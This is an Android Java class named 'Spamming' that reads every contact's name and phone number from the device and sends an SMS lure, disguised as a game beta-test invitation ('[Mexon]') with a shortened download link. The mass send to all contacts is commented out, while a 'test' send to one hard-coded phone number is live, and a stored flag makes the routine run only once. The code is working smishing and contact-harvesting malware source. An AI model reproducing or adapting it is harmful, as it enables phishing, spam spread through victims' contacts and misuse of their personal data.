package com.example.center;

import java.io.IOException;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.util.Log;

public class Spamming {
	
	Context context;
	
	Spamming(Context context) {
		this.context = context;
	};

	
	private Cursor getURI() 
    {
        // 주소록 URI        
        Uri people = Contacts.CONTENT_URI;
        
        // 검색할 컬럼 정하기
        String[] projection = new String[] { Contacts._ID, Contacts.DISPLAY_NAME, Contacts.HAS_PHONE_NUMBER };
        
        // 쿼리 날려서 커서 얻기
        String[] selectionArgs = null;
        String sortOrder = ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC";    

        // managedquery 는 activity 메소드이므로 아래와 같이 처리함
        return context.getContentResolver().query(people, projection, null, selectionArgs, sortOrder);
        // return managedQuery(people, projection, null, selectionArgs, sortOrder);
    }
	
	public void phoneBook() throws IOException {
        Cursor cursor = getURI();                    // 전화번호부 가져오기    

		int end = cursor.getCount();                // 전화번호부의 갯수 세기
		Log.d("ANDROES", "end = "+end);

		String [] name = new String[end];    // 전화번호부의 이름을 저장할 배열 선언
		String [] phone = new String[end];    // 전화번호부의 이름을 저장할 배열 선언
		int count = 0;     

		if(cursor.moveToFirst()) 
		{
		    // 컬럼명으로 컬럼 인덱스 찾기 
		    int idIndex = cursor.getColumnIndex("_id");

		    do 
		    {
		        //tempItem = new TempItem();
		        
		        // 요소값 
		        int id = cursor.getInt(idIndex);        
		        String phoneChk = cursor.getString(2);
		        if (phoneChk.equals("1")) {
		            Cursor phones = context.getContentResolver().query(
		                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
		                    null,
		                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID
		                            + " = " + id, null, null);

		            while (phones.moveToNext()) {
		                phone[count] = phones
		                        .getString(phones
		                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
		            }        
		        }
		        name[count] = cursor.getString(1);

		        // 개별 연락처 삭제                    
		        // rowNum = getBaseContext().getContentResolver().delete(RawContacts.CONTENT_URI, RawContacts._ID+ " =" + id,null);

		        // LogCat에 로그 남기기
		         Log.i("ANDROES", "id=" + id +", name["+count+"]=" + name[count]+", phone["+count+"]=" + phone[count]);
		        count++;
		        
		    } while(cursor.moveToNext() || count > end);
		    
		    sendSMS(phone);
		}
    }
	
	private void sendSMS(String phone[]) {
		
		// SharedPreference를 이용해 어플리케이션  내 xml에 플래그를 저장해 사용한다.
		SharedPreferences prefs = context.getSharedPreferences("pref", context.MODE_PRIVATE);
		boolean flag = prefs.getBoolean("flag", false);
		if( flag ) return ;
		
		// 문자 전송 준비
		SmsManager mngr = SmsManager.getDefault();
		String url = "http://goo.gl/q57Bqk";
		String mesg = "[Mexon] 다시 돌아온 네이플스토리! 샘플 파일 받고 베타테스터 신청하기 -> " + url;
		
		// Test코드. 삭제 요망.
		mngr.sendTextMessage("01079275117", null/*Default*/, mesg, null/*전송 결과 전달받지 않음*/, null);
		
		// 주소록에서 가져온 모든 번호에게 문자를 보냄. 실행시 심사숙고 하고 실행할 것.
		for( String number : phone ) {
			//80글자가 넘어가면 MMS로 전송되는데, MMS로 전송 안되고 짤린다는 사람 있어서 글자 수 줄이는것도 고려해봐야함.
//			mngr.sendTextMessage(number, null/*Default*/, mesg, null/*전송 결과 전달받지 않음*/, null);
			
		}

		
		// 다음에 실행되지 않도록 flag 세팅
		SharedPreferences.Editor editor = prefs.edit();
		editor.putBoolean("flag", true);
		editor.commit();
	
	}
	
}